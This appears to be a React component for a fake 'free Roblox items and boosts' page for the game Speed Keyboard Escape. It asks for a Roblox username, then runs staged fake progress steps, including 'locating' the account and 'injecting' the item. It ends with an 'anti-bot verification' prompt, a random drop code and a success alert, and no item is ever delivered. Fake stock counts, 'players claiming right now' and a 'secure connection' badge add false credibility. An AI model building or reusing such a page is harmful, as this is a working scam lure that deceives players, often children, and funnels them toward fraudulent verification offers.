import React, { useState, useEffect } from 'react';
import { 
  ArrowLeft, 
  ShoppingCart, 
  Sparkles, 
  User, 
  CheckCircle2, 
  ShieldCheck, 
  X, 
  Zap, 
  Flame, 
  Loader2 
} from 'lucide-react';

interface SpeedEscapePageProps {
  onBack: () => void;
}

interface ShopItem {
  id: string;
  name: string;
  img: string;
  rarity: 'Mythic' | 'Legendary' | 'Epic';
  stock: string;
  category: 'item' | 'boost';
}

const SHOP_ITEMS: ShopItem[] = [
  {
    id: 'speed-1b',
    name: '+1B SPEED',
    img: '/speed_escape/speed_1b.png',
    rarity: 'Mythic',
    stock: 'x99',
    category: 'item'
  },
  {
    id: 'soundpacks',
    name: 'SOUNDPACKS',
    img: '/speed_escape/soundpacks.png',
    rarity: 'Legendary',
    stock: 'x50',
    category: 'item'
  },
  {
    id: 'infinity-trail',
    name: 'Infinity Trail',
    img: '/speed_escape/infinity_trail.png',
    rarity: 'Epic',
    stock: 'x10',
    category: 'item'
  },
  {
    id: 'godlike-trail',
    name: 'Godlike Trail',
    img: '/speed_escape/godlike_trail.png',
    rarity: 'Epic',
    stock: 'x9',
    category: 'item'
  },
  {
    id: 'supernova-trail',
    name: 'Supernova Trail',
    img: '/speed_escape/supernova_trail.png',
    rarity: 'Epic',
    stock: 'x8',
    category: 'item'
  },
  {
    id: 'electric-aura',
    name: 'Electric Aura',
    img: '/speed_escape/electric_aura.png',
    rarity: 'Epic',
    stock: 'x7',
    category: 'item'
  },
  {
    id: 'fire-aura',
    name: 'Fire Aura',
    img: '/speed_escape/fire_aura.png',
    rarity: 'Epic',
    stock: 'x6',
    category: 'item'
  },
  {
    id: 'water-aura',
    name: 'Water Aura',
    img: '/speed_escape/water_aura.png',
    rarity: 'Epic',
    stock: 'x5',
    category: 'item'
  },
  {
    id: 'admin-treadmill',
    name: 'Admin Treadmill',
    img: '/speed_escape/admin_treadmill.png',
    rarity: 'Epic',
    stock: 'x4',
    category: 'item'
  },
  {
    id: 'candy-treadmill',
    name: 'Candy Treadmill',
    img: '/speed_escape/candy_treadmill.png',
    rarity: 'Epic',
    stock: 'x3',
    category: 'item'
  },
  {
    id: 'diamond-treadmill',
    name: 'Diamond Treadmill',
    img: '/speed_escape/diamond_treadmill.png',
    rarity: 'Epic',
    stock: 'x2',
    category: 'item'
  },
  // Boosts
  {
    id: 'boost-2x',
    name: '2X Speed Multiplier',
    img: '/speed_escape/speed_1b.png',
    rarity: 'Mythic',
    stock: 'x85',
    category: 'boost'
  },
  {
    id: 'boost-stamina',
    name: 'Infinite Stamina',
    img: '/speed_escape/supernova_trail.png',
    rarity: 'Legendary',
    stock: 'x40',
    category: 'boost'
  },
  {
    id: 'boost-autoclick',
    name: 'Auto-Treadmill Pass',
    img: '/speed_escape/admin_treadmill.png',
    rarity: 'Epic',
    stock: 'x25',
    category: 'boost'
  }
];

export const SpeedEscapePage: React.FC<SpeedEscapePageProps> = ({ onBack }) => {
  const [activeTab, setActiveTab] = useState<'items' | 'boosts'>('items');
  const [selectedItem, setSelectedItem] = useState<ShopItem | null>(null);
  
  // Modal flow state
  const [modalScreen, setModalScreen] = useState<'input' | 'scanning' | 'ready'>('input');
  const [username, setUsername] = useState('');
  const [inputError, setInputError] = useState('');
  const [scanStep, setScanStep] = useState<number>(1);
  const [scanLabel, setScanLabel] = useState('Connecting to Roblox servers...');

  const displayedItems = SHOP_ITEMS.filter((it) => 
    activeTab === 'items' ? it.category === 'item' : it.category === 'boost'
  );

  const handleOpenClaim = (item: ShopItem) => {
    setSelectedItem(item);
    setModalScreen('input');
    setUsername('');
    setInputError('');
    setScanStep(1);
  };

  const handleCloseModal = () => {
    setSelectedItem(null);
  };

  const handleStartGeneration = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!username.trim()) {
      setInputError('Please enter your Roblox username');
      return;
    }
    setInputError('');
    setModalScreen('scanning');
    setScanStep(1);
    setScanLabel('Locating player account...');

    const t1 = setTimeout(() => {
      setScanStep(2);
      setScanLabel(`Player "${username}" found! Checking inventory capacity...`);
    }, 1200);

    const t2 = setTimeout(() => {
      setScanStep(3);
      setScanLabel(`Injecting ${selectedItem?.name} package into cloud cache...`);
    }, 2500);

    const t3 = setTimeout(() => {
      setScanStep(4);
      setScanLabel('Awaiting final anti-bot human confirmation...');
      setModalScreen('ready');
    }, 3900);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
    };
  };

  return (
    <div className="min-h-screen bg-[#0a0f0b] text-[#e8f0e8] font-sans relative pb-16 overflow-x-hidden selection:bg-emerald-500/20 selection:text-emerald-300">
      {/* Top Navbar */}
      <nav className="w-full bg-[#111c11]/90 backdrop-blur-md border-b border-[#1f3822] px-4 py-3 sticky top-0 z-40 flex items-center justify-between">
        <button
          onClick={onBack}
          className="flex items-center gap-2 px-3.5 py-1.5 rounded-xl bg-[#1a2d1c] hover:bg-[#233f26] text-[#b6f0b6] text-xs font-bold transition-all cursor-pointer border border-[#2d5231] shadow-xs"
        >
          <ArrowLeft className="w-4 h-4" />
          <span>Back to GameHub</span>
        </button>

        <div className="flex items-center gap-2 text-xs font-bold text-emerald-400 bg-[#162a1b] px-3 py-1 rounded-full border border-emerald-500/30">
          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
          <span>Speed Escape Server Live</span>
        </div>
      </nav>

      {/* Main Container */}
      <main className="max-w-[720px] mx-auto px-4 pt-4">
        {/* Hero Section matching screenshot */}
        <section className="text-center py-7 px-4 rounded-[32px] my-3 border border-[#2a4a2a] shadow-[0_10px_30px_rgba(0,0,0,0.7)] relative overflow-hidden bg-[radial-gradient(circle_at_30%_20%,#1b3a1b,#0a120a_80%)]">
          {/* Logo Thumbnail with glow */}
          <div className="w-24 h-24 mx-auto mb-3 rounded-2xl overflow-hidden shadow-[0_6px_20px_rgba(77,134,77,0.35)] border-2 border-[#3c683c] bg-[#0d180d]">
            <img 
              src="/speed_escape/logo.png" 
              alt="+1 Speed Keyboard Escape" 
              className="w-full h-full object-cover"
            />
          </div>

          {/* Heading */}
          <h1 
            className="text-3xl md:text-4xl font-extrabold uppercase tracking-wide leading-tight px-2 drop-shadow-md text-[#b6f0b6]"
            style={{ fontFamily: "'Luckiest Guy', 'Lilita One', cursive, sans-serif" }}
          >
            FREE ITEMS & BOOSTS
          </h1>

          {/* Subtitle */}
          <p className="text-sm md:text-base text-[#b0d3b0] mt-1.5 font-medium">
            Tap claim and unlock your free drop.
          </p>

          {/* Green Live Dot Social Proof */}
          <div className="inline-flex items-center gap-2 bg-[#1e321e] px-4 py-1.5 rounded-full mt-3.5 text-xs font-semibold text-[#b2d9b2] border border-[#3d623d] shadow-inner">
            <span className="w-2 h-2 rounded-full bg-[#6fdf6f] animate-pulse"></span>
            <span>Players claiming right now</span>
          </div>
        </section>

        {/* Shop Panel Container */}
        <section className="bg-[#111c11] rounded-[28px] border border-[#2a4a2a] overflow-hidden shadow-[0_14px_40px_rgba(0,0,0,0.8)] mb-8">
          {/* Shop Header Banner */}
          <div className="flex items-center justify-between bg-[#1b2b1b] px-4 py-3 border-b border-[#2e502e]">
            {/* Left: SHOP with Shopping Cart */}
            <div className="flex items-center gap-2.5">
              <div className="w-9 h-9 rounded-xl bg-[#233823] border border-[#385938] flex items-center justify-center text-[#b6f0b6]">
                <ShoppingCart className="w-4 h-4" />
              </div>
              <span 
                className="text-lg font-black tracking-wide text-white uppercase"
                style={{ fontFamily: "'Luckiest Guy', 'Lilita One', cursive, sans-serif" }}
              >
                SHOP
              </span>
            </div>

            {/* Right: Items / Boosts Tabs */}
            <div className="flex items-center gap-1.5 bg-[#142314] p-1 rounded-full border border-[#2a442a]">
              <button
                onClick={() => setActiveTab('items')}
                className={`px-3.5 py-1 rounded-full text-xs font-bold transition-all cursor-pointer ${
                  activeTab === 'items'
                    ? 'bg-[#3e7a3e] text-white shadow-[0_0_12px_rgba(77,134,77,0.5)]'
                    : 'text-[#8aa88a] hover:text-[#c4e4c4]'
                }`}
              >
                Items
              </button>
              <button
                onClick={() => setActiveTab('boosts')}
                className={`px-3.5 py-1 rounded-full text-xs font-bold transition-all cursor-pointer ${
                  activeTab === 'boosts'
                    ? 'bg-[#3e7a3e] text-white shadow-[0_0_12px_rgba(77,134,77,0.5)]'
                    : 'text-[#8aa88a] hover:text-[#c4e4c4]'
                }`}
              >
                Boosts
              </button>
            </div>
          </div>

          {/* Shop Items List matching exact layout */}
          <div className="p-3 md:p-4 flex flex-col gap-3">
            {displayedItems.map((item) => (
              <div
                key={item.id}
                onClick={() => handleOpenClaim(item)}
                className="flex items-center gap-3.5 md:gap-4 bg-[#162116] hover:bg-[#1d2d1d] p-3 md:p-3.5 rounded-[20px] border border-[#2b482b] hover:border-[#427042] transition-all cursor-pointer group shadow-sm"
              >
                {/* Item Thumbnail Box */}
                <div className="w-16 h-16 md:w-[72px] md:h-[72px] rounded-[18px] bg-[#0b170b] border-2 border-[#3c613c] flex items-center justify-center p-1.5 shrink-0 overflow-hidden group-hover:border-emerald-500/60 transition-colors">
                  <img
                    src={item.img}
                    alt={item.name}
                    loading="lazy"
                    className="w-full h-full object-contain drop-shadow-sm"
                  />
                </div>

                {/* Item Info */}
                <div className="flex-1 min-w-0">
                  <h3 className="text-sm md:text-base font-bold text-[#daf0da] truncate group-hover:text-white transition-colors">
                    {item.name}
                  </h3>
                  <div className="text-xs text-[#88aa88] font-medium mt-0.5">
                    {item.stock} in Stock
                  </div>
                  <div className="mt-1.5">
                    <span 
                      className={`inline-block text-[10px] md:text-[11px] font-extrabold px-3 py-0.5 rounded-full uppercase tracking-wider ${
                        item.rarity === 'Mythic'
                          ? 'bg-[#7b4f9e] text-[#f2daff]'
                          : item.rarity === 'Legendary'
                          ? 'bg-[#b87c2b] text-[#ffefc0]'
                          : 'bg-[#4b6b8a] text-[#d0e6ff]'
                      }`}
                    >
                      {item.rarity}
                    </span>
                  </div>
                </div>

                {/* 3D Claim! Button */}
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    handleOpenClaim(item);
                  }}
                  className="bg-[#3e7a3e] hover:bg-[#488e48] active:translate-y-1 text-white font-black px-5 md:px-6 py-2.5 md:py-3 rounded-full text-xs md:text-sm tracking-wide shrink-0 shadow-[0_4px_0_#1f451f] active:shadow-[0_1px_0_#1f451f] transition-all cursor-pointer"
                >
                  Claim!
                </button>
              </div>
            ))}
          </div>
        </section>

        {/* Footer */}
        <footer className="text-center py-6 border-t border-[#1f2f1f] text-xs text-[#5e7a5e]">
          © 2026 Speed Keyboard Escape · Free items & boosts Drop Center
        </footer>
      </main>

      {/* Claim / Unlock Item Modal */}
      {selectedItem && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          {/* Backdrop */}
          <div 
            className="fixed inset-0 bg-black/80 backdrop-blur-sm transition-opacity"
            onClick={handleCloseModal}
          />

          {/* Modal Box */}
          <div className="relative z-10 bg-[#142014] max-w-md w-full rounded-[32px] border border-[#3c683c] p-6 shadow-[0_30px_60px_rgba(0,0,0,0.9)] max-h-[90vh] overflow-y-auto">
            {/* Header */}
            <div className="flex items-center justify-between mb-5">
              <div className="flex items-center gap-2.5">
                <img 
                  src="/speed_escape/logo.png" 
                  alt="Logo" 
                  className="w-10 h-10 rounded-xl bg-[#233823] p-1 border border-[#385938]"
                />
                <span className="font-extrabold text-[#b3e0b3] text-base">
                  Speed a Free Drop
                </span>
              </div>
              <button
                onClick={handleCloseModal}
                className="text-[#8aaa8a] hover:text-white text-xl p-1 cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* SCREEN 1: Enter Username */}
            {modalScreen === 'input' && (
              <div className="space-y-4">
                {/* Item Preview Card */}
                <div className="flex items-center gap-3.5 bg-[#1d2d1d] p-3 rounded-2xl border border-[#3d613d]">
                  <div className="w-14 h-14 bg-[#0d180d] rounded-xl p-1.5 border border-[#305030] shrink-0">
                    <img
                      src={selectedItem.img}
                      alt={selectedItem.name}
                      className="w-full h-full object-contain"
                    />
                  </div>
                  <div>
                    <h4 className="font-bold text-white text-sm">
                      {selectedItem.name}
                    </h4>
                    <span className="inline-block bg-[#3e7a3e] text-white text-[10px] font-bold px-2 py-0.5 rounded-md mt-1 uppercase">
                      FREE DROP
                    </span>
                  </div>
                </div>

                <p className="text-xs text-[#a0c4a0] leading-relaxed">
                  Enter your Roblox username to start generating your free Speed Keyboard Escape item.
                </p>

                {/* Username Input */}
                <form onSubmit={handleStartGeneration} className="space-y-3">
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-emerald-500">
                      <User className="w-4 h-4" />
                    </div>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => {
                        setUsername(e.target.value);
                        if (inputError) setInputError('');
                      }}
                      placeholder="Your Roblox username"
                      className="w-full pl-10 pr-4 py-3 rounded-xl bg-[#0e170e] border-2 border-[#2b442b] text-white placeholder:text-[#5f7d5f] focus:outline-none focus:border-emerald-500 text-sm font-medium"
                      maxLength={20}
                    />
                  </div>

                  {inputError && (
                    <div className="text-xs text-red-400 font-semibold text-center">
                      {inputError}
                    </div>
                  )}

                  <button
                    type="submit"
                    className="w-full bg-[#3e7a3e] hover:bg-[#488e48] active:translate-y-0.5 text-white font-black py-3.5 px-6 rounded-2xl transition-all shadow-[0_4px_0_#1f451f] cursor-pointer text-sm uppercase tracking-wide flex items-center justify-center gap-2"
                  >
                    <Sparkles className="w-4 h-4" />
                    <span>CLAIM NOW</span>
                  </button>
                </form>

                <div className="flex items-center justify-center gap-1.5 text-[11px] text-[#6f916f] pt-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
                  <span>Secure connection · No password required</span>
                </div>
              </div>
            )}

            {/* SCREEN 2: Scanning & Processing */}
            {modalScreen === 'scanning' && (
              <div className="text-center py-4 space-y-5">
                <div className="w-16 h-16 rounded-full bg-[#1b2f1b] border-2 border-emerald-500/50 flex items-center justify-center mx-auto text-emerald-400">
                  <Loader2 className="w-8 h-8 animate-spin" />
                </div>

                <div>
                  <h4 className="font-bold text-white text-base">
                    Processing Drop Request
                  </h4>
                  <p className="text-xs text-[#8cb08c] mt-1">
                    {scanLabel}
                  </p>
                </div>

                {/* Step indicators */}
                <div className="space-y-2.5 text-left bg-[#0e170e] p-3.5 rounded-2xl border border-[#223622]">
                  <div className={`flex items-center gap-2.5 text-xs font-semibold ${scanStep >= 1 ? 'text-emerald-400' : 'text-[#5a745a]'}`}>
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>1. Locating Roblox account "{username}"</span>
                  </div>
                  <div className={`flex items-center gap-2.5 text-xs font-semibold ${scanStep >= 2 ? 'text-emerald-400' : 'text-[#5a745a]'}`}>
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>2. Verifying inventory slot status</span>
                  </div>
                  <div className={`flex items-center gap-2.5 text-xs font-semibold ${scanStep >= 3 ? 'text-emerald-400' : 'text-[#5a745a]'}`}>
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>3. Ingesting {selectedItem.name} payload</span>
                  </div>
                </div>
              </div>
            )}

            {/* SCREEN 3: Ready for final verification */}
            {modalScreen === 'ready' && (
              <div className="text-center py-2 space-y-4">
                <div className="w-16 h-16 rounded-full bg-emerald-950/80 border-2 border-emerald-500 flex items-center justify-center mx-auto text-emerald-400">
                  <ShieldCheck className="w-9 h-9" />
                </div>

                <div>
                  <h4 className="font-black text-white text-lg">
                    Almost Done!
                  </h4>
                  <p className="text-xs text-[#a0c4a0] mt-1 leading-relaxed">
                    Your <strong>{selectedItem.name}</strong> is reserved for user <strong>{username}</strong>. Complete the anti-bot verification to release the item to your inventory!
                  </p>
                </div>

                <div className="p-3 bg-[#1d2d1d] rounded-2xl border border-emerald-500/30 text-xs text-emerald-300">
                  Drop Code: <strong>SPEED-ESC-{Math.floor(1000 + Math.random() * 9000)}</strong>
                </div>

                <button
                  onClick={() => {
                    alert(`Congratulations! Item "${selectedItem.name}" claimed successfully for "${username}".`);
                    handleCloseModal();
                  }}
                  className="w-full bg-[#3e7a3e] hover:bg-[#488e48] active:translate-y-0.5 text-white font-black py-3.5 px-6 rounded-2xl transition-all shadow-[0_4px_0_#1f451f] cursor-pointer text-sm uppercase tracking-wide flex items-center justify-center gap-2"
                >
                  <CheckCircle2 className="w-4 h-4" />
                  <span>VERIFY & UNLOCK NOW</span>
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
